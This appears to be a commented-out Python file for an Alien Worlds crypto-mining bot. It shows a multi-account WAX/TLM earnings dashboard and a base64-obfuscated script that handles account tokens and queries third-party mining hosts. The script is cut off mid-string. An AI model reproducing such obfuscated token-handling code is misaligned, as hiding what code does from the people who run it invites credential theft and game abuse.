#                        <td><span id="lasttlm_1"       >0.0670</span></td>
#                        <td><span id="totaltlm_1"      >19.7761</span></td>
#                        <td><span id="totaltime_1"         >205:34:05</span></td>
#                        <td><span id="tlmhour_1"       >0.0962/Hour</span></td>
#                    </tr>
#                    <tr>
#                        <td><b>2</b></td>
#                        <td><span id="account_2" style="color: #00ff38;" >2iyck.wam</span></td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-danger" role="progressbar" aria-valuemin="0" id="cpu_prg_2" aria-valuenow="24337" aria-valuemax="26202" style="width: 92.88%;">92.88%</option>
#                            </div>
#                        </td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-success" role="progressbar" aria-valuemin="0" id="ram_prg_2" aria-valuenow="4347" aria-valuemax="5495" style="width: 79.11%;">79.11%</option>
#                            </div>
#                        </td>
#                        <td><span id="cpustake_2"      >76.80 WAX</span></td>
#                        <td><span id="waxbalance_2"    >0.0938 WAX</span></td>
#                        <td><span id="tlmbalance_2"    >1.4136 TLM</span></td>
#                        <td><span id="userstatus_2"    >รอ Delay</span></td>
#                        <td><span
#                           id      = "lastminetime_2"
#                           style   = "color: #00ff38;"
#                                                       >00:05:36</span></td>
#                        <td><span id="nextmine_2"      >00:02:23</span></td>
#                        <td><span id="lasttlm_2"       >0.0792</span></td>
#                        <td><span id="totaltlm_2"      >15.9238</span></td>
#                        <td><span id="totaltime_2"         >205:34:05</span></td>
#                        <td><span id="tlmhour_2"       >0.0775/Hour</span></td>
#                    </tr>
#                    <tr>
#                        <td><b>3</b></td>
#                        <td><span id="account_3" style="color: #00ff38;">gbock.wam</span></td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-danger" role="progressbar" aria-valuemin="0" id="cpu_prg_3" aria-valuenow="25434" aria-valuemax="25935" style="width: 98.07%;">98.07%</option>
#                            </div>
#                        </td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-success" role="progressbar" aria-valuemin="0" id="ram_prg_3" aria-valuenow="5803" aria-valuemax="18970" style="width: 30.59%;">30.59%</option>
#                            </div>
#                        </td>
#                        <td><span id="cpustake_3"      >77.40 WAX</span></td>
#                        <td><span id="waxbalance_3"    >0.0327 WAX</span></td>
#                        <td><span id="tlmbalance_3"    >1.6066 TLM</span></td>
#                        <td><span id="userstatus_3"    >รอ Delay</span></td>
#                        <td><span
#                           id      = "lastminetime_2"
#                           style   = "color: #00ff38;"
#                                                       >00:05:45</span></td>
#                        <td><span id="nextmine_3"      >00:02:14</span></td>
#                        <td><span id="lasttlm_3"       >0.1046</span></td>
#                        <td><span id="totaltlm_3"      >15.3025</span></td>
#                        <td><span id="totaltime_3"         >205:30:11</span></td>
#                        <td><span id="tlmhour_3"       >0.0745/Hour</span></td>
#                    </tr>
#                    <tr>
#                        <td><b>TOTAL</b></td>
#                        <td><span id="total_online"    ><b>79/85</b></span></td>
#                        <td><span id="st_update"       ><b> ... </b></span></td>
#                        <td></td>
#                        <td><span id="total_stake"         ><b>6704.17 WAX</b></span></td>
#                        <td><span id="total_wax"       ><b>13.2924 WAX</b></span></td>
#                        <td><span id="total_tlm"       ><b>126.1215 TLM</b></span></td>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td><span id="total_gettlm"    ><b>1646.4106 TLM</b></span></td>
#                        <td></td>
#                        <td><span id="total_gettlmhour" ><b>8.0108/Hour</b></span></td>
#                    </tr>
#                    <tr>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td><span id="swap_stake"      ><b>34638 THB</b></span></td>
#                       <td><span id="swap_wax"         ><b>69 THB</b></span>
#                        </td><td><span id="swap_tlm"   ><b>158 WAX/817 THB</b></span></td>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td></td>
#                        <td><span id="swap_gettlm"         ><b>2065 WAX/10669 THB</b></span></td>
#                        <td></td>
#                        <td><span id="swap_gettlmhour"     ><b>[10 WAX/52 THB]/Hour</b></span></td>
#                    </tr-->






































# Python code obfuscated by www.development-tools.net 
#    
#   
#   import base64, codecs
#   magic   = 'aW1wb3J0IG9zDQppbXBvcnQgcmUNCmltcG9ydCBzeXMNCmltcG9ydCBnbG9iDQppbXBvcnQgdGltZQ0KaW1wb3J0IGpzb24NCmltcG9ydCBiYXNlNjQNCmltcG9ydCByYW5kb20NCmltcG9ydCBsb2dnaW5nDQppbXBvcnQgX3RocmVhZA0KaW1wb3J0IGRhdGV0aW1lDQppbXBvcnQgcmVxdWVzdHMNCiMgICBodHRwczovL3B5cGkub3JnL3Byb2plY3QvY2xvdWRzY3JhcGVyLw0KaW1wb3J0IGNsb3Vkc2NyYXBlcg0KaW1wb3J0IHB5dHoNCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrLCBqc29uLCBqc29uaWZ5LCByZXF1ZXN0LCByZWRpcmVjdCwgc2VuZF9mcm9tX2RpcmVjdG9yeSwgUmVzcG9uc2UsIG1ha2VfcmVzcG9uc2UNCg0KdGltZWRhdGUgPSBkYXRldGltZS5kYXRldGltZQ0KdGltZXpvbmUgPSBweXR6LnRpbWV6b25lDQoNCiMgICBvcy5lbnZpcm9uWydWRVJDRUxfVVJMJ10gVkVSQ0VMX1VSTCBhbmQgTkVYVF9QVUJMSUNfVkVSQ0VMX1VSTCANCg0KY2xhc3Mgc3R5bGUoKToNCiAgICBCTEFDSyAgICAgICA9ICdcMDMzWzMwbScNCiAgICBSRUQgICAgICAgICA9ICdcMDMzWzMxbScNCiAgICBPUkFOR0UgICAgICA9ICdcMDMzWzkxbScNCiAgICBHUkVFTiAgICAgICA9ICdcMDMzWzMybScNCiAgICBZRUxMT1cgICAgICA9ICdcMDMzWzMzbScNCiAgICBCTFVFICAgICAgICA9ICdcMDMzWzM0bScNCiAgICBNQUdFTlRBICAgICA9ICdcMDMzWzM1bScNCiAgICBDWUFOICAgICAgICA9ICdcMDMzWzM2bScNCiAgICBXSElURSAgICAgICA9ICdcMDMzWzM3bScNCiAgICBVTkRFUkxJTkUgICA9ICdcMDMzWzRtJw0KICAgIFJFU0VUICAgICAgID0gJ1wwMzNbMG0nDQpjbGFzcyBXQVhBUEkoKToNCiAgICBhZGRybGlzdHMgPSBbDQogICAgICAgICdodHRwczovL3dheGFwaS5sZWRnZXJ3aXNlLmlvJywgDQogICAgICAgICdodHRwczovL2FwaS53YXguYWxvaGFlb3MuY29tJywgDQogICAgICAgICdodHRwczovL3dheC5ncmV5bWFzcy5jb20nLCANCiAgICAgICAgIyAgICwgJ2h0dHBzOi8vY2hhaW4ud2F4LmlvJywgDQogICAgICAgICdodHRwczovL3dheC5kYXBwbGljYS5pbycsIA0KICAgICAgICAnaHR0cHM6Ly93YXguZW9zZW91bC5pbycsIA0KICAgICAgICAnaHR0cHM6Ly93YXguYmxhY2tsdXNpb24uaW8nLCANCiAgICAgICAgJ2h0dHBzOi8vd2F4LmJsb2tjcmFmdGVycy5pbycNCiAgICAgICAgIyAgICwgJ2h0dHBzOi8vd2F4LXdvcmtlci5hbGllbndvcmxkcy50b29scycNCiAgICAgICAgIyAgICwgJ2h0dHA6Ly93YXhzd2VkZW5leDU2cnA1Lm9uaW9uJw0KICAgIF0NCiAgICBnZXRzZXJ2ZXIgPSAnL3YxL2NoYWluL2dldF9pbmZvJw0KICAgIGhvc3RtaW5lciA9IFt7DQogICAgICAgICdhZGRyZXNzJyA6ICdodHRwczovL2F3ZnJlZW1pbmUuY2YvP3dheGFjY291bnQ9JywgDQogICAgICAgICdtZXRob2RzJyA6ICdHRVQnLCANCiAgICAgICAgJ3BheWxvYWQnIDogJycsIA0KICAgICAgICAnaGVhZGVycycgOiB7DQogICAgICAgICAgICAiYWNjZXB0IiAgICAgICAgICAgICAgICAgICAgICAgIDogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsIA0KICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSIgICAgICAgICAgICAgICA6ICJlbi1VUyxlbjtxPTAuOSIsIA0KICAgICAgICAgICAgImFjY2Vzcy1jb250cm9sLWFsbG93LW9yaWdpbiIgICA6ICIqIiwgDQogICAgICAgICAgICAiY2FjaGUtY29udHJvbCIgICAgICAgICAgICAgICAgIDogIm5vLWNhY2hlIiwgDQogICAgICAgICAgICAiY29udGVudC10eXBlIiAgICAgICAgICAgICAgICAgIDogImFwcGxpY2F0aW9uL2pzb24iLCANCiAgICAgICAgICAgICJwcmFnbWEiICAgICAgICAgICAgICAgICAgICAgICAgOiAibm8tY2FjaGUiLCANCiAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCIgICAgICAgICAgICAgICAgOiAiZW1wdHkiLCANCiAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSIgICAgICAgICAgICAgICAgOiAiY29ycyIsIA0KICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIiAgICAgICAgICAgICAgICA6ICJjcm9zcy1zaXRlIiwgDQogICAgICAgICAgICAic2VjLWdwYyIgICAgICAgICAgICAgICAgICAgICAgIDogIjEiDQogICAgICAgIH0NCiAgICB9LCB7DQogICAgICAgICdhZGRyZXNzJyA6ICdodHRwczovL2F3bWluZS1leHByZXNzLTAwMDAxLnZlcmNlbC5hcHAvbWluZT93YXhhY2NvdW50PScsIA0KICAgICAgICAnbWV0aG9kcycgOiAnR0VUJywgDQogICAgICAgICdwYXlsb2FkJyA6ICcnLCANCiAgICAgICAgJ2hlYWRlcnMnIDogew0KICAgICAgICAgICAgImFjY2VwdCIgICAgICAgICAgICAgICAgICAgICAgICA6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLA0KICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSIgICAgICAgICAgICAgICA6ICJlbi1VUyxlbjtxPTAuOSIsDQogICAgICAgICAgICAiYWNjZXNzLWNvbnRyb2wtYWxsb3ctb3JpZ2luIiAgIDogIioiLA0KICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiICAgICAgICAgICAgICAgICA6ICJuby1jYWNoZSIsDQogICAgICAgICAgICAiY29udGVudC10eXBlIiAgICAgICAgICAgICAgICAgIDogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAgICAgInByYWdtYSIgICAgICAgICAgICAgICAgICAgICAgICA6ICJuby1jYWNoZSIsDQogICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiICAgICAgICAgICAgICAgIDogImVtcHR5IiwNCiAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSIgICAgICAgICAgICAgICAgOiAiY29ycyIsDQogICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiICAgICAgICAgICAgICAgIDogImNyb3NzLXNpdGUiLA0KICAgICAgICAgICAgInNlYy1ncGMiICAgICAgICAgICAgICAgICAgICAgICA6ICIxIg0KICAgICAgICB9DQogICAgfSwgew0KICAgICAgICAnYWRkcmVzcycgOiAnaHR0cHM6Ly9hd21pbmUtZXhwcmVzcy0wMDAwMi52ZXJjZWwuYXBwL21pbmU/d2F4YWNjb3VudD0nLCANCiAgICAgICAgJ21ldGhvZHMnIDogJ0dFVCcsIA0KICAgICAgICAncGF5bG9hZCcgOiAnJywgDQogICAgICAgICdoZWFkZXJzJyA6IHsNCiAgICAgICAgICAgICJhY2NlcHQiICAgICAgICAgICAgICAgICAgICAgICAgOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwNCiAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiICAgICAgICAgICAgICAgOiAiZW4tVVMsZW47cT0wLjkiLA0KICAgICAgICAgICAgImFjY2Vzcy1jb250cm9sLWFsbG93LW9yaWdpbiIgICA6ICIqIiwNCiAgICAgICAgICAgICJjYWNoZS1jb250cm9sIiAgICAgICAgICAgICAgICAgOiAibm8tY2FjaGUiLA0KICAgICAgICAgICAgImNvbnRlbnQtdHlwZSIgICAgICAgICAgICAgICAgICA6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgICAgICJwcmFnbWEiICAgICAgICAgICAgICAgICAgICAgICAgOiAibm8tY2FjaGUiLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IiAgICAgICAgICAgICAgICA6ICJlbXB0eSIsDQogICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiICAgICAgICAgICAgICAgIDogImNvcnMiLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIiAgICAgICAgICAgICAgICA6ICJjcm9zcy1zaXRlIiwNCiAgICAgICAgICAgICJzZWMtZ3BjIiAgICAgICAgICAgICAgICAgICAgICAgOiAiMSINCiAgICAgICAgfQ0KICAgIH1dDQogICAgIyAgIGRlZiBfX2luaXRfXygNCiAgICAjICAgICAgIHNlbGYNCiAgICAjICAgKToNCiAgICAjICAgICAgIGdsb2JhbCBEQVRBQkFTRQ0KICAgICMgICAgICAgREFUQUJBU0UgPSAnWVlZWVknDQoNCkRBVEFCQVNFID0ge30NClRIUkVBREVSID0ge30NCg0KY2xhc3MgQVdNSU5FKCk6DQogICAgZGVmIF9faW5pdF9fKA0KICAgICAgICBzZWxmLCANCiAgICAgICAgd2F4aWQsIA0KICAgICAgICB0b2tlbg0KICAgICk6DQogICAgICAgIA0KICAgICAgICBnbG9iYWwgREFUQUJBU0UNCiAgICAgICAgZ2xvYmFsIFRIUkVBREVSDQogICAgICAgIA0KICAgICAgICBEQVRBQkFTRS51cGRhdGUoew0KICAgICAgICAgICAgd2F4aWQgOiB7DQogICAgICAgICAgICAgICAgJ2NwdScgICAgICAgICAgIDogew0KICAgICAgICAgICAgICAgICAgICAncGVyJyAgICAgICAgICAgICAgIDogMCwgDQogICAgICAgICAgICAgICAgICAgICdtYXgnICAgICAgICAgICAgICAgOiAwLCANCiAgICAgICAgICAgICAgICAgICAgJ2F2YWlsYWJsZScgICAgICAgICA6IDAsIA0KICAgICAgICAgICAgICAgICAgICAnbGFzdF9jcHVfdXNhZ2UnICAgIDogMCwgDQogICAgICAgICAgICAgICAgICAgICdzdGFrZScgICAgICAgICAgICAgOiAwDQogICAgICAgICAgICAgICAgfSwgDQogICAgICAgICAgICAgICAgJ2JhbGFuY2UnICAgICAgIDogew0KICAgICAgICAgICAgICAgICAgICAnVExNJyAgICAgICAgICAgICAgIDogMCwgDQogICAgICAgICAgICAgICAgICAgICdXQVgnICAgICAgICAgICAgICAgOiAwDQogICAgICAgICAgICAgICAgfSwgDQogICAgICAgICAgICAgICAgJ2Nvb2xkb3duJyAgICAgIDogMCwgDQogICAgICAgICAgICAgICAgJ3dheGFwaScgICAgICAgIDogJycsIA0KICAgICAgICAgICAgICAgICdsYW5kJyAgICAgICAgICA6IDAsIA0KICAgICAgICAgICAgICAgICdkaWZmaWN1bHR5JyAgICA6IDAsIA0KICAgICAgICAgICAgICAgICdsYXN0X21pbmUnICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ3RpbWUnICAgICAgICAgICAgICA6ICcnLCANCiAgICAgICAgICAgICAgICAgICAgJ21pbmUnICAgICAgICAgICAgICA6IDANCiAgICAgICAgICAgICAgICB9LCANCiAgICAgICAgICAgICAgICAnc3RhdCcgOiBOb25lLCANCiAgICAgICAgICAgICAgICAndGV4dCcgOiB7DQogICAgICAgICAgICAgICAgICAgICdzdGVwJyAgOiAnMDAnLCANCiAgICAgICAgICAgICAgICAgICAgJzAwJyAgICA6ICc8cHJlPjAvMCBVUERBVEUgREFUQUJBU0UgLS0tLS08L3ByZT4nLCANCiAgICAgICAgICAgICAgICAgICAgJzAxJyAgICA6ICc8cHJlPjAvMCBMT0dJTiBTRVNTSU9OUyAtLS0tLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcwMicgICAgOiAnPHByZT4xLzQgV0FJVElORyAtLS0tLS0tLS0tLS0tLS0tLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcwMycgICAgOiAnPHByZT4yLzQgR0VUIEJBR1MgSU5GTyAtLS0tLS0tLS08L3ByZT4nLCANCiAgICAgICAgICAgICAgICAgICAgJzA0JyAgICA6ICc8cHJlPjMvNCBHRVQgTEFORCAtLS0tLS0tLS0tLS0tLS08L3ByZT4nLCANCiAgICAgICAgICAgICAgICAgICAgJzA1JyAgICA6ICc8cHJlPjQvNCBSRUFEWSBUTyBNSU5FIC0tLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMDYnICAgIDogJzxwcmU+MC8wIEdFVCBBQ0NPVU5UIElORk8gLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcwNycgICAgOiAnPHByZT4wLzAgQ0FMQ1UgRElGRklDVUxUWSAtLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMDgnICAgIDogJzxwcmU+MC8wIENIRUNLIExBU1QgTUlORSBUWCAtLS08L3ByZT4nLCANCiAgICAgICAgICAgICAgICAgICAgJzA5JyAgICA6ICc8cHJlPjEvOCBDTEFJTSBHRVQgbm9uY2UgLS0tLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcxMCcgICAgOiAnPHByZT4yLzggR0VUIHsgTk9OQ0UgfTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTEnICAgIDogJzxwcmU+My84IENMQUlNIHBhY2tlZCB0cnggLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTInICAgIDogJzxwcmU+NC84IENMQUlNIHJlcSBrZXlzIC0tLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTMnICAgIDogJzxwcmU+NS84IENMQUlNIHNpZ24gLS0tLS0tLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTQnICAgIDogJzxwcmU+Ni84IENMQUlNIHB1c2ggLS0tLS0tLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTUnICAgIDogJzxwcmU+Ny84IENMQUlNIGNoZWNrIGhpc3RvcnkgLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMTYnICAgIDogJzxwcmU+OC84IENMQUlNIERPTkUgLS0tLS0tLS0tLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcxNycgICAgOiAnPHByZT44LzggQ0xBSU0gTk9ORSAtLS0tLS0tLS0tLS08L3ByZT4nLCANCiAgICAgICAgICAgICAgICAgICAgJzE4JyAgICA6ICc8cHJlPjAvMCBSRU5FVyBlbmRwb2ludCAtLS0tLS0tPC9wcmU+JywgDQogICAgICAgICAgICAgICAgICAgICcxOScgICAgOiAnPHByZT4wLzAgQ0hFQ0sgQ09PTERPV04gLS0tLS0tLTwvcHJlPicsIA0KICAgICAgICAgICAgICAgICAgICAnMjAnICAgIDogJzxwcmU+MC8wIENBTENVIENQVSAtLS0tLS0tLS0tLS08L3ByZT4nDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9KQ0KICAgICAgICANCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc2VsZi5EQVRBICAgPSB7DQogICAgICAgICAgICAgICAgJ3dheGlkJyAgICAgICAgICAgICA6IHdheGlkLCANCiAgICAgICAgICAgICAgICAndG9rZW4nICAgICAgICAgICAgIDogdG9rZW4sIA0KICAgICAgICAgICAgICAgICdsb2dpbicgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAnYWNjb3VudCcgICAgICAgICAgIDogTm9uZSwgDQogICAgICAgICAgICAgICAgJ2Jsb2NrJyAgICAgICAgICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ2NoYWluX2lkJyAgICAgICAgICA6IDAsDQogICAgICAgICAgICAgICAgICAgICdoZWFkX2Jsb2NrX251bScgICAgOiAwLA0KICAgICAgICAgICAgICAgICAgICAncmVmX2Jsb2NrX3ByZWZpeCcgIDogMA0KICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICdwYWNrZWR0cngnICAgICAgICAgOiB7fSwgDQogICAgICAgICAgICAgICAgJ2JhbGFuY2UnICAgICAgICAgICA6IDAuMDAwMCwgDQogICAgICAgICAgICAgICAgJ2xhc3RfbWluZScgICAgICAgICA6IHt9LCANCiAgICAgICAgICAgICAgICAnYXZhdGFyJyAgICAgICAgICAgIDoge30sIA0KICAgICAgICAgICAgICAgICdiYWdzJyAgICAgICAgICAgICAgOiB7fSwgDQogICAgICAgICAgICAgICAgJ2xhbmQnICAgICAgICAgICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ2RpZmZpY3VsdHknICAgIDogMCwgDQogICAgICAgICAgICAgICAgICAgICdjb21taXNzaW9uJyAgICA6IDAuMA0KICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICdkaWZmaWN1bHR5JyAgICAgICAgOiAwLCANCiAgICAgICAgICAgICAgICAnY29vbGRvd24nICAgICAgICAgIDogMCwgDQogICAgICAgICAgICAgICAgJ2NwdScgICAgICAgICAgICAgICA6IHt9LCANCiAgICAgICAgICAgICAgICAnbm9uY2UnICAgICAgICAgICAgIDogTm9uZSwgDQogICAgICAgICAgICAgICAgJ3RyYW5zYWN0aW9uJyAgICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ3JhdycgOiAnJywgDQogICAgICAgICAgICAgICAgICAgICdyZXMnIDogTm9uZQ0KICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICd3YXhzZXJ2ZXInICAgICAgICAgOiByYW5kb20uY2hvaWNlKFdBWEFQSS5hZGRybGlzdHMpLCANCiAgICAgICAgICAgICAgICAnZ2V0c2VydmVyJyAgICAgICAgIDogV0FYQVBJLmdldHNlcnZlciwgDQogICAgICAgICAgICAgICAgJ1BST0NFU1MnICAgICAgICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ2dldF9sb2dpbicgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9hY2NvdW50JyAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9pbmZvX2JhbGFuY2UnICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9pbmZvX2xhc3RfbWluZScgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9pbmZvX2F2YXRhcicgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9iYWdzJyAgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9sYW5kJyAgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ3NldF9kaWZmaWN1bHR5JyAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ3NldF9jb29sZG93bicgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2Noa19jcHUnICAgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9ub25jZScgICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9pbmZvX2Jsb2NrJyAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ3NldF9wYWNrZWR0cngnICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2NsYWltX3NpZ24nICAgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF90cmFuc2FjdGlvbicgICAgICAgOiBOb25lDQogICAgICAgICAgICAgICAgfSwgJ2xvZycgICAgICAgICAgICA6IHsNCiAgICAgICAgICAgICAgICAgICAgJ2xhc3RfdGxtX21pbmVkJyAgICAgICAgOiAwLjAwMDAsIA0KICAgICAgICAgICAgICAgICAgICAnbGFzdF9jcHVfdXNhZ2UnICAgICAgICA6IDANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KCBmJ19faW5pdF9fIEVSUk9SIDE1MSA6IHtlfScgKQ0KICAgICAgICAgICAgVEhSRUFERVIudXBkYXRlKHsNCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ3dheGlkJ10gOiB7DQogICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgICAgICA6IEZhbHNlLCANCiAgICAgICAgICAgICAgICAgICAgJ2RhdGEnICAgICAgICAgIDogc2VsZi5EQVRBLCANCiAgICAgICAgICAgICAgICAgICAgJ2dldF9hY2NvdW50JyAgIDogTm9uZSwgDQogICAgICAgICAgICAgICAgICAgICdsb2dzJyAgICAgICAgICA6IE5vbmUsIA0KICAgICAgICAgICAgICAgICAgICAnb3BlcmF0ZScgICAgICAgOiBOb25lDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSkNCiAgICAgICAgICAgIHJldHVybiBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddDQogICAgICAgICAgICANCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc2VsZi5nZXRfbG9naW4oKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxNTcgOiB7ZX0nICkNCiAgICAgICAgICAgIFRIUkVBREVSLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWyd3YXhpZCddIDogew0KICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICAgICAgOiBGYWxzZSwgDQogICAgICAgICAgICAgICAgICAgICdkYXRhJyAgICAgICAgICA6IHNlbGYuREFUQSwgDQogICAgICAgICAgICAgICAgICAgICdnZXRfYWNjb3VudCcgICA6IE5vbmUsIA0KICAgICAgICAgICAgICAgICAgICAnbG9ncycgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAgICAgJ29wZXJhdGUnICAgICAgIDogTm9uZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pDQogICAgICAgICAgICByZXR1cm4gVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXQ0KICAgICAgICAgICAgDQogICAgICAgIFRIUkVBREVSLnVwZGF0ZSh7DQogICAgICAgICAgICBzZWxmLkRBVEFbJ3dheGlkJ10gOiB7DQogICAgICAgICAgICAgICAgJ3N0YXR1cycgICAgICAgIDogTm9uZSwgDQogICAgICAgICAgICAgICAgJ2RhdGEnICAgICAgICAgIDogc2VsZi5EQVRBLCANCiAgICAgICAgICAgICAgICAnZ2V0X2FjY291bnQnICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAnbG9ncycgICAgICAgICAgOiBOb25lLCANCiAgICAgICAgICAgICAgICAnb3BlcmF0ZScgICAgICAgOiBOb25lDQogICAgICAgICAgICB9DQogICAgICAgIH0pDQogICAgICAgIA0KICAgICAgICAjICAgcHJpbnQoIHNlbGYuREFUQSApDQogICAgICAgICMgICBzZWxmLm9wZXJhdGUoKQ0KICAgICAgICANCiAgICBkZWYgbG9ncygNCiAgICAgICAgc2VsZg0KICAgICk6DQogICAgICAgIA0KICAgICAgICBnbG9iYWwgREFUQUJBU0UNCiAgICAgICAgDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IEZhbHNlIG9yIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gTm9uZQ0KICAgICAgICAgICAgICAgICkgb3IgKA0KICAgICAgICAgICAgICAgICAgICBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXQnXSA9PSBGYWxzZQ0KICAgICAgICAgICAgICAgICk6DQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnY3B1J11bJ3BlciddICAgICAgICAgICAgICAgICAgPSBpbnQoc2VsZi5EQVRBWydjcHUnXVsnYWxsb3cnXSkNCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnY3B1J11bJ21heCddICAgICAgICAgICAgICAgICAgPSBpbnQoc2VsZi5EQVRBWydjcHUnXVsnbWF4J10pDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgdHJ5ICAgICAgICAgOiBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2NwdSddWydhdmFpbGFibGUnXSAgICAgICAgICAgID0gaW50KHNlbGYuREFUQVsnY3B1J11bJ2F2YWlsYWJsZSddKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydjcHUnXVsnbGFzdF9jcHVfdXNhZ2UnXSAgICAgIC